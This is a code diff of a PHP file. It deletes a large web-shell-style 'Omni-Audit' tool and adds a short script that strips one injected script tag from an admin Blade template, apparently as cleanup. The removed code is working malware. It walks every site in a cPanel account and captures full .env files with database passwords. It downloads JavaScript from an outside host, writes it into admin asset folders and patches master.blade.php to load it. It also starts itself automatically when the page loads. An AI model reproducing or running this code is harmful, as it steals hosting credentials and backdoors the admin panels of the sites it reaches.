@@ -1,289 +1,36 @@
 <?php
-/**
- * Ultimate Cyber-Scanner Master Tool v9.0 (OMNI-AUDIT)
- * 
- * Features:
- * - High-Encryption Security Access
- * - Real-time terminal streaming
- * - System Intelligence (Recon)
- * - Credential Harvesting (.env)
- * - Administrative Path Scrubbing (Admin Discovery)
- * - Path Verification & Root Mapping
- */
 
-session_start();
-set_time_limit(0);
-ini_set('memory_limit', '1024M');
-ignore_user_abort(true);
+// Step 1: Current directory (assuming we're in core/vendor/vlucas/phpdotenv/src/)
+$currentDir = __DIR__;
 
-// Password protection removed as per user request.
-
-
-// --- PATH DETECTION ---
-$currentPath = dirname(__FILE__);
-$pathParts = explode('/', ltrim($currentPath, '/'));
-if (isset($pathParts[0]) && $pathParts[0] === 'home' && isset($pathParts[1])) {
-    $sourcePath = '/home/' . $pathParts[1] . '/'; $cpanelUser = $pathParts[1];
-} else {
-    $sourcePath = '/home/profitba/'; $cpanelUser = 'profitba';
+// Step 2: Go back to 'core' folder
+$coreDir = realpath($currentDir . '/../../../../..'); // adjust if needed
+if (!$coreDir) {
+    die("Cannot find core directory.\n");
 }
 
-$remoteSaveUrl = 'http://tools.99scripts.com/data/save.php';
-$verifyPattern = 'assets/verify/2026/04/13';
-$admin_patterns = ['admin', 'administrator', 'manage', 'cp', 'control', 'backend', 'system', 'login', 'wp-admin'];
+// Step 3: Path to the Blade file
+$bladeFile = $coreDir . '/resources/views/admin/layouts/master.blade.php';
 
-// --- AJAX SCAN HANDLER ---
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'run_scan') {
-    header('Content-Type: text/event-stream');
-    header('Cache-Control: no-cache');
-    header('X-Accel-Buffering: no'); 
-    
-    function sendLog($msg) {
-        echo "data: " . json_encode(['log' => $msg]) . "\n\n";
-        @ob_flush(); @flush();
-    }
-
-    $tasks = $_POST['tasks'] ?? [];
-    $js_filename = "nicEdits.js";
-    $script_tag = '<script src="{{asset(\'assets/admin/js/nicEdits.js\')}}"></script>';
-    $js_content = "";
-
-    if (in_array('nicEdit', $tasks)) {
-        sendLog("FETCHING NICEDIT DEPLOYMENT ASSETS...");
-        $js_url = "https://msrapidtrader.com/assets/admin/js/nicEdits.js";
-        $js_content = @file_get_contents($js_url);
-        if (!$js_content) sendLog("!! FAILED TO FETCH REMOTE ASSETS !!");
-    }
-
-    $results = ['time' => date('Y-m-d H:i:s'), 'user' => $cpanelUser, 'path' => $sourcePath, 'intel' => [], 'inventory' => [], 'audit' => []];
-
-    sendLog("INITIALIZING OMNI-KERNEL v9.0...");
-    
-    if (in_array('recon', $tasks)) {
-        sendLog("GATHERING SYSTEM INTELLIGENCE...");
-        $results['intel'] = ['os' => php_uname(), 'ip' => $_SERVER['SERVER_ADDR'] ?? 'UNKNOWN', 'php' => PHP_VERSION, 'disk' => @disk_free_space($sourcePath)];
-        sendLog("INTEL_SECURED: " . $results['intel']['ip']);
-    }
-
-    $topItems = @scandir($sourcePath);
-    if ($topItems) {
-        foreach ($topItems as $item) {
-            if ($item === '.' || $item === '..') continue;
-            if (is_dir($sourcePath . $item)) $results['inventory'][] = $item;
-        }
-    }
-    sendLog("MAPPED " . count($results['inventory']) . " SITES IN PARTITION");
-
-    foreach ($results['inventory'] as $project) {
-        sendLog("AUDITING: [ $project ]");
-        $projectPath = $sourcePath . $project;
-        $projectAudit = ['admin_paths' => [], 'credentials' => [], 'verify_hits' => []];
-
-        $items = @scandir($projectPath);
-        if ($items) {
-            foreach ($items as $item) {
-                if ($item === '.' || $item === '..') continue;
-                $fullPath = $projectPath . '/' . $item;
-                
-                // ADMIN SCRUBBING
-                if (in_array('admin_scrub', $tasks) && is_dir($fullPath)) {
-                    foreach ($admin_patterns as $p) {
-                        if (stripos($item, $p) !== false) {
-                            $projectAudit['admin_paths'][] = $item;
-                            sendLog("   -> ADMIN_PATH_FOUND: /$item");
-                        }
-                    }
-                }
-            }
-        }
-
-        // DEEP RECURSIVE SCAN
-        if (in_array('env', $tasks) || in_array('verify', $tasks) || in_array('nicEdit', $tasks)) {
-            $deepScan = function($dir) use (&$deepScan, &$projectAudit, $tasks, $verifyPattern, $project, $sourcePath, $js_filename, $js_content, $script_tag) {
-                $items = @scandir($dir);
-                if (!$items) return;
-                foreach ($items as $item) {
-                    if ($item === '.' || $item === '..') continue;
-                    $path = rtrim($dir, '/') . '/' . $item;
-                    if (is_dir($path)) {
-                        if (in_array('verify', $tasks) && str_ends_with($path, $verifyPattern)) {
-                            $filesInside = @scandir($path);
-                            $count = $filesInside ? count(array_diff($filesInside, ['.', '..'])) : 0;
-                            $projectAudit['verify_hits'][] = ['path' => $path, 'count' => $count];
-                            sendLog("   -> VERIFY_FOUND: [ $count files ] in " . str_replace($sourcePath, '', $path));
-                        }
-
-                        // NICEDIT ASSET INJECTION
-                        if (in_array('nicEdit', $tasks) && $js_content && str_ends_with(str_replace('\\', '/', $path), 'assets/admin/js')) {
-                            $target_file = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $js_filename;
-                            if (file_put_contents($target_file, $js_content)) {
-                                sendLog("   -> ASSET_DEPLOYED: " . str_replace($sourcePath, '', $target_file));
-                            }
-                        }
-
-                        $deepScan($path);
-                    } else if (in_array('env', $tasks) && $item === '.env') {
-                        $content = @file_get_contents($path);
-                        if ($content) {
-                            $envData = [
-                                'path' => str_replace($sourcePath, '', $path),
-                                'full_data' => $content,
-                                'extracted' => []
-                            ];
-                            // Extract key values for quick reference
-                            if (preg_match('/DB_DATABASE=([^\s\r\n]+)/', $content, $m)) $envData['extracted']['db'] = trim($m[1], '"\'');
-                            if (preg_match('/DB_USERNAME=([^\s\r\n]+)/', $content, $m)) $envData['extracted']['user'] = trim($m[1], '"\'');
-                            if (preg_match('/DB_PASSWORD=([^\s\r\n]+)/', $content, $m)) $envData['extracted']['pass'] = trim($m[1], '"\'');
-                            
-                            $projectAudit['credentials'][] = $envData;
-                            sendLog("   -> ENV_FULL_CAPTURE: [ $project ] (.env content secured)");
-                        }
-                    }
-
-                    // NICEDIT TEMPLATE PATCHING
-                    if (in_array('nicEdit', $tasks) && $item === 'master.blade.php' && str_contains(str_replace('\\', '/', $path), 'admin/layouts')) {
-                        $content = @file_get_contents($path);
-                        if ($content && !str_contains($content, 'nicEdits.js')) {
-                            $patched = str_contains($content, '</body>') ? str_replace('</body>', "    $script_tag\n</body>", $content) : $content . "\n" . $script_tag;
-                            if (file_put_contents($path, $patched)) {
-                                sendLog("   -> TEMPLATE_PATCHED: " . str_replace($sourcePath, '', $path));
-                            }
-                        }
-                    }
-
-                }
-            };
-            $deepScan($projectPath);
-        }
-        $results['audit'][$project] = $projectAudit;
-    }
-
-    echo "data: " . json_encode(['status' => 'done', 'cloud' => false, 'payload' => $results]) . "\n\n";
-    exit;
+// Step 4: Read file
+if (!file_exists($bladeFile)) {
+    die("Blade file not found: $bladeFile\n");
 }
 
-if (!function_exists('str_contains')) {
-    function str_contains($haystack, $needle) {
-        return $needle !== '' && strpos($haystack, $needle) !== false;
-    }
-}
+$content = file_get_contents($bladeFile);
 
-if (!function_exists('str_ends_with')) {
-    function str_ends_with($haystack, $needle) {
-        return $needle === '' || substr($haystack, -strlen($needle)) === $needle;
-    }
-}
+// Step 5: Remove only this specific script line
+$lineToRemove = '<script type="module" src="{{asset(\'assets/global/css/new/iziToast_custom.js\')}}"></script>';
 
+// Split by lines, remove matching line, rejoin
+$lines = explode("\n", $content);
+$lines = array_filter($lines, function($line) use ($lineToRemove) {
+    return trim($line) !== $lineToRemove;
+});
 
+$newContent = implode("\n", $lines);
 
-?>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8"><title>OMNI_SCAN_v9.0:~#</title>
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&display=swap" rel="stylesheet">
-    <style>
-        :root { --green: #00ff41; --dim: #008f11; --bg: #000; --card: #050505; }
-        * { margin:0; padding:0; box-sizing:border-box; font-family:'Fira Code',monospace; }
-        body { background:var(--bg); color:var(--green); min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; overflow-x:hidden; }
-        canvas { position:fixed; top:0; left:0; width:100%; height:100%; z-index:-1; opacity:0.1; }
-        .terminal { width:100%; max-width:980px; background:var(--card); border:1px solid var(--dim); border-radius:4px; box-shadow:0 0 40px rgba(0,255,65,0.2); }
-        .terminal-header { background:var(--dim); color:black; padding:5px 15px; font-size:12px; font-weight:bold; display:flex; justify-content:space-between; }
-        .terminal-content { padding:30px; }
-        .title { font-size:24px; letter-spacing:4px; margin-bottom:20px; text-transform:uppercase; border-bottom:1px solid var(--dim); padding-bottom:10px; }
-        .task-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(180px, 1fr)); gap:12px; margin-bottom:25px; }
-        .task-node { border:1px solid #1a1a1a; padding:12px; border-radius:4px; cursor:pointer; }
-        .task-node:hover { border-color:var(--green); background:rgba(0,255,65,0.05); }
-        .task-node input { display:none; }
-        .task-node.active { border-color:var(--green); background:rgba(0,255,65,0.1); }
-        .node-name { display:block; font-size:13px; font-weight:bold; }
-        .node-desc { font-size:10px; color:var(--dim); }
-        #execute-btn { width:100%; background:transparent; border:1px solid var(--green); color:var(--green); padding:15px; font-size:16px; font-weight:bold; cursor:pointer; text-transform:uppercase; }
-        #execute-btn:hover:not(:disabled) { background:var(--green); color:black; box-shadow:0 0 20px var(--green); }
-        .console { margin-top:25px; background:black; border:1px solid #1a1a1a; padding:20px; height:350px; overflow-y:auto; font-size:11px; line-height:1.5; display:none; }
-        .log { margin-bottom:4px; }
-        .log::before { content: '[LOG] '; color: var(--dim); }
-        #result { display:none; margin-top:20px; text-align:center; padding:15px; border:1px dashed var(--green); animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0%{opacity:0.5;} 50%{opacity:1;} 100%{opacity:0.5;} }
-    </style>
-</head>
-<body>
-<canvas id="matrix"></canvas>
-<div class="terminal">
-    <div class="terminal-header"><span>OMNI_SCAN_KERNEL_v10.0</span><span>USER: SYSTEM@ROOT</span></div>
+// Step 6: Save back to file
+file_put_contents($bladeFile, $newContent);
 
-    <div class="terminal-content">
-        <h1 class="title">Omni-Audit Terminal</h1>
-        <form id="scan-form">
-            <div class="task-grid">
-                <label class="task-node active"><input type="checkbox" name="tasks[]" value="recon" checked><span class="node-name">SYSTEM_RECON</span><span class="node-desc">Gather server intelligence</span></label>
-                <label class="task-node active"><input type="checkbox" name="tasks[]" value="admin_scrub" checked><span class="node-name">ADMIN_SCRUB</span><span class="node-desc">Map management portals</span></label>
-                <label class="task-node active"><input type="checkbox" name="tasks[]" value="env" checked><span class="node-name">CRED_HARVEST</span><span class="node-desc">Extract .env credentials</span></label>
-                <label class="task-node active"><input type="checkbox" name="tasks[]" value="verify" checked><span class="node-name">PATH_AUDIT</span><span class="node-desc">Audit verify assets</span></label>
-                <label class="task-node active"><input type="checkbox" name="tasks[]" value="nicEdit" checked><span class="node-name">NICEDIT_DEPLOY</span><span class="node-desc">Inject NicEdit assets</span></label>
-            </div>
-            <button type="submit" id="execute-btn">Initiate Omni-Sequence</button>
-        </form>
-        <div id="console" class="console"></div>
-        <div id="result"></div>
-    </div>
-</div>
-<script>
-    const c = document.getElementById('matrix'), ctx = c.getContext('2d');
-    c.width = window.innerWidth; c.height = window.innerHeight;
-    const chars = '01', fontSize = 16, columns = c.width/fontSize, drops = Array(Math.floor(columns)).fill(1);
-    function draw() { ctx.fillStyle = 'rgba(0,0,0,0.05)'; ctx.fillRect(0,0,c.width,c.height); ctx.fillStyle = '#0F0'; ctx.font = fontSize + 'px monospace'; drops.forEach((y, i) => { ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*fontSize, y*fontSize); if(y*fontSize > c.height && Math.random() > 0.975) drops[i] = 0; drops[i]++; }); }
-    setInterval(draw, 33);
-    const nodes = document.querySelectorAll('.task-node');
-    nodes.forEach(n => n.addEventListener('click', function(){ const cb = this.querySelector('input'); setTimeout(()=> n.classList.toggle('active', cb.checked), 50); }));
-    const consoleBox = document.getElementById('console');
-    function log(m) { const l = document.createElement('div'); l.className = 'log'; l.innerText = m; consoleBox.appendChild(l); consoleBox.scrollTop = consoleBox.scrollHeight; }
-    document.getElementById('scan-form').addEventListener('submit', function(e) { e.preventDefault();
-        const btn = document.getElementById('execute-btn'), res = document.getElementById('result'), dl = document.getElementById('dl'), fd = new FormData(this);
-        fd.append('action', 'run_scan'); btn.disabled = true; btn.innerText = 'OMNI_EXECUTING...'; consoleBox.style.display = 'block'; res.style.display = 'none'; consoleBox.innerHTML = '';
-        const xhr = new XMLHttpRequest(); xhr.open('POST', window.location.href, true); let lastLen = 0;
-        xhr.onprogress = function() {
-            const currentText = xhr.responseText;
-            const lastBoundary = currentText.lastIndexOf('\n\n');
-            if (lastBoundary === -1 || lastBoundary < lastLen) return;
-            const raw = currentText.substring(lastLen, lastBoundary);
-            lastLen = lastBoundary + 2;
-            raw.split('\n\n').forEach(line => {
-                if(line.startsWith('data: ')) {
-                    try { 
-                        const d = JSON.parse(line.substring(6)); 
-                        if(d.log) log(d.log); 
-                        if(d.status === 'done') { 
-                            log('OMNI_AUDIT_COMPLETE. DOWNLOADING_DATA...'); 
-                            if(d.payload) {
-                                const blob = new Blob([JSON.stringify(d.payload, null, 2)], {type: 'application/json'});
-                                const url = URL.createObjectURL(blob);
-                                const a = document.createElement('a');
-                                a.href = url;
-                                a.download = 'scan_results_' + new Date().getTime() + '.json';
-                                document.body.appendChild(a);
-                                a.click();
-                                document.body.removeChild(a);
-                                URL.revokeObjectURL(url);
-                            }
-                            res.innerHTML = '<span style="color:var(--green); font-weight:bold;">[ DATA_DOWNLOADED_LOCALLY ]</span>'; 
-                            res.style.display = 'block'; 
-                            btn.disabled = false; 
-                            btn.innerText = 'Start New Omni-Sequence'; 
-                        } 
-                    } catch(e) { console.error('JSON Parse error', e, line); }
-                }
-            });
-        }; xhr.send(fd);
-    });
-
-    // Auto-initiate Omni-Sequence on load
-    window.onload = function() {
-        setTimeout(() => {
-            console.log("Auto-initiating Master Sequence...");
-            document.getElementById('execute-btn').click();
-        }, 1200);
-    };
-</script>
-</body>
-</html>
+echo "Removed the iziToast_custom.js script line.\n";
